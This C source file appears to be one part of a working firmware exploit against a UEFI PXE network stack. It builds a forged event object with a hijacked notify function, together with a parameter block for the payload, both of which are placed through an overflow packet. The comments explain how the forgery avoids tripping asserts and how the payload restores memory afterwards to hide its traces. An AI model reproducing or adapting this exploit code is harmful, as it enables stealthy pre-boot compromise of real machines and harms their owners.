/* graft.c - the counterfeit IEVENT, and the payload's parameter block.
 *
 * CoreSignalEvent() walks the signalled-event list and calls
 * IEvent->NotifyFunction(Event, Context) at TPL_HIGH_LEVEL.  Planting an event
 * whose NotifyFunction is our payload costs exactly one call, on the normal
 * dispatch path, with the normal stack shape.
 *
 * The object is written to be self-consistent (signature, type, TPL, list
 * links) so neither CoreSignalEvent nor the list walk trips an assert before
 * the payload runs.  The payload then restores this 0x48-byte window from the
 * snapshot taken before the packet was sent, so afterwards the object is
 * byte-identical to its pre-attack state.
 */

#include <string.h>
#include "pxe_layout.h"
#include "graft.h"

static void wr64(uint8_t *p, size_t off, uint64_t v)
{
  memcpy(p + off, &v, 8);
}
static void wr32(uint8_t *p, size_t off, uint32_t v)
{
  memcpy(p + off, &v, 4);
}

size_t build_event_graft(uint8_t *out, size_t cap, const graft_args_t *a)
{
  if (cap < GRAFT_EVENT_LEN)
    return 0;
  memset(out, 0, GRAFT_EVENT_LEN);

  wr32(out, EVT_OFF_SIGNATURE, EVENT_SIGNATURE);
  wr32(out, EVT_OFF_TYPE,      0x00000002u);         /* EVT_NOTIFY_SIGNAL */
  wr32(out, EVT_OFF_SIGNALCOUNT, 1u);                /* already signalled */
  wr64(out, EVT_OFF_SIGNALLINK,     a->signal_link_fwd);
  wr64(out, EVT_OFF_SIGNALLINK + 8, a->signal_link_bwd);
  wr64(out, EVT_OFF_NOTIFYTPL,  a->notify_tpl);
  wr64(out, EVT_OFF_NOTIFYFN,   a->notify_fn);
  wr64(out, EVT_OFF_NOTIFYCTX,  a->notify_ctx);

  return GRAFT_EVENT_LEN;
}

/* Parameter block handed to the payload as Context.  Deliberately placed in
 * the same overflow buffer: it lives in the IcmpError/pool region, which the
 * firmware has no reason to touch while PXE is still running, so the payload
 * can read it without any allocation of its own. */
size_t build_param_block(uint8_t *out, size_t cap, const param_block_t *pb)
{
  if (cap < PB_LEN)
    return 0;
  memset(out, 0, PB_LEN);
  wr64(out, 0x00, PB_MAGIC);
  wr64(out, 0x08, pb->graft);
  wr64(out, 0x10, pb->event);
  wr64(out, 0x18, pb->shadow);
  wr64(out, 0x20, pb->uart);
  wr64(out, 0x28, pb->uart_stride);
  wr64(out, 0x30, pb->out_buf);
  wr64(out, 0x38, pb->out_cap);
  wr64(out, 0x40, pb->ranges);
  wr64(out, 0x48, pb->range_n);
  return PB_LEN;
}
